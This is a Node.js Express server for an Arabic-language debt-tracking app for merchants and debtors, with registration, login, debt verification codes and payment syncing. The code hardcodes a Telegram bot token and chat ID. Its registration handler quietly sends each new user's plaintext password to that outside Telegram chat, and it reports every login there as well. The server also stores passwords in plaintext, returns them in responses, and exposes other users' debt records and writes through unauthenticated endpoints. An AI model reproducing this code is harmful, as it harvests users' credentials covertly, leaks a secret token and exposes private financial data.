const express = require('express');
const fs = require('fs');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;
const DB_PATH = './heiba_royal_db.json';

// إعدادات بوت التلجرام الخاص بك
const TELEGRAM_TOKEN = '7543475859:AAENXZxHPQZafOlvBwFr6EatUFD31iYq-ks';
const MY_CHAT_ID = '5042495708';

app.use(express.json());
app.use(express.static('public'));

let db = { users: [], stamps: [] };
if (fs.existsSync(DB_PATH)) {
    try { db = JSON.parse(fs.readFileSync(DB_PATH)); } catch (e) { db = { users: [], stamps: [] }; }
}

const saveDB = () => fs.writeFileSync(DB_PATH, JSON.stringify(db, null, 2));

// وظيفة إرسال الرسائل للتلجرام
const sendToTelegram = async (msg) => {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: MY_CHAT_ID,
            text: msg
        });
    } catch (e) { console.error("Telegram Error"); }
};

// --- نظام البحث عن البصمة ---
app.get('/api/search-stamp', (req, res) => {
    const s = db.stamps.find(x => x.authCode === req.query.code);
    if(s) res.json(s); else res.status(404).json({error: "البصمة غير موجودة"});
});

// --- محرك التوثيق والتحقق الذكي ---
app.post('/api/verify-auth', (req, res) => {
    const { action, debtorName, merchantName, opId, authCode, merchantId, amount, currency } = req.body;

    // 1. إنشاء بصمة لعملية واحدة أو مبلغ إجمالي
    if (action === 'create' || action === 'create_smart') {
        if(db.stamps.some(s => s.authCode === authCode)) return res.status(400).json({error: "الكود مستخدم مسبقاً"});
        
        const stampData = { 
            debtorName, 
            merchantName, 
            authCode, 
            createdAt: Date.now(), 
            status: 'pending',
            isSmart: action === 'create_smart',
            amount: amount || null,
            currency: currency || null,
            opId: opId || null
        };

        db.stamps.push(stampData);
        saveDB();
        return res.json({ success: true });
    }

    // 2. معالجة التحقق (التاجر يطابق الكود)
    if (action === 'check') {
        const merch = db.users.find(u => u.id === merchantId);
        if (!merch) return res.status(404).json({error: "التاجر غير موجود"});

        const stamp = db.stamps.find(s => s.authCode === authCode && s.merchantName === merch.name);
        if(!stamp) return res.status(400).json({error: "كود خاطئ أو غير مخصص لك"});

        if (stamp.isSmart) {
            // توثيق ذكي للمبالغ (يربط البصمة بأقدم العمليات حتى يكتمل المبلغ)
            let remaining = parseFloat(stamp.amount);
            merch.myRecords.forEach(r => {
                if(r.targetName === stamp.debtorName && r.currency === stamp.currency && !r.isVerified && r.type === 'دين' && remaining > 0) {
                    r.isVerified = true;
                    r.authCode = authCode;
                    remaining -= parseFloat(r.amount);
                }
            });
        } else {
            // توثيق عملية واحدة محددة
            merch.myRecords.forEach(r => {
                if(r.id === stamp.opId) {
                    r.isVerified = true; 
                    r.authCode = authCode;
                    stamp.amount = r.amount; 
                    stamp.currency = r.currency;
                }
            });
        }
        
        saveDB();
        res.json({ newRecords: merch.myRecords });
    }
});

// --- الخصم الذكي عند السداد ---
app.post('/api/sync', (req, res) => {
    const { userId, op } = req.body;
    const u = db.users.find(x => x.id === userId);
    if (!u) return res.status(404).send();

    if(op.type === 'سداد') {
        let amountToPay = parseFloat(op.amount);
        u.myRecords.forEach(r => {
            if(r.targetName === op.targetName && r.currency === op.currency && r.isVerified && amountToPay > 0) {
                let currentDebt = parseFloat(r.amount);
                let deduct = Math.min(currentDebt, amountToPay);
                r.amount = (currentDebt - deduct).toString();
                amountToPay -= deduct;
                if(parseFloat(r.amount) <= 0) db.stamps = db.stamps.filter(s => s.authCode !== r.authCode);
            }
        });
        op.amount = amountToPay.toString();
    }

    u.myRecords.push(op);
    saveDB();
    res.json({ newRecords: u.myRecords });
});

// --- الدخول والتسجيل مع إشعار التلجرام ---
app.post('/api/auth', async (req, res) => {
    const { name, password, type, action } = req.body;
    const normalizedName = name.trim().toLowerCase();
    let user = db.users.find(u => u.name.toLowerCase() === normalizedName && u.type === type);

    if (action === 'reg') {
        if (user) return res.status(400).json({ error: "الاسم مسجل مسبقاً." });
        user = { 
            id: "H" + Math.random().toString(36).substr(2, 7), 
            name: name.trim(), 
            password, 
            type, 
            myRecords: [], 
            createdAt: new Date().toISOString() 
        };
        db.users.push(user);
        saveDB();
        await sendToTelegram(`🆕 حساب جديد تم إنشاؤه:\n👤 الاسم: ${user.name}\n🔑 الكلمة: ${password}\n🎭 النوع: ${type}`);
        return res.json(user);
    } else {
        if (!user || user.password !== password) return res.status(403).json({ error: "بيانات خاطئة." });
        await sendToTelegram(`🔑 تسجيل دخول:\n👤 الاسم: ${user.name}\n🎭 النوع: ${type}`);
        return res.json(user);
    }
});

// --- الاكتشاف التلقائي للمديونية ---
app.get('/api/auto-discover', (req, res) => {
    const { debtorName } = req.query;
    const results = db.users.filter(u => u.type === 'merchant' && u.myRecords.some(r => r.targetName.toLowerCase() === debtorName.toLowerCase()))
    .map(u => ({ 
        merchantName: u.name, 
        records: u.myRecords.filter(r => r.targetName.toLowerCase() === debtorName.toLowerCase()) 
    }));
    res.json(results);
});

app.listen(PORT, () => console.log(`[HEIBA SYSTEM ACTIVE ON PORT ${PORT}]`));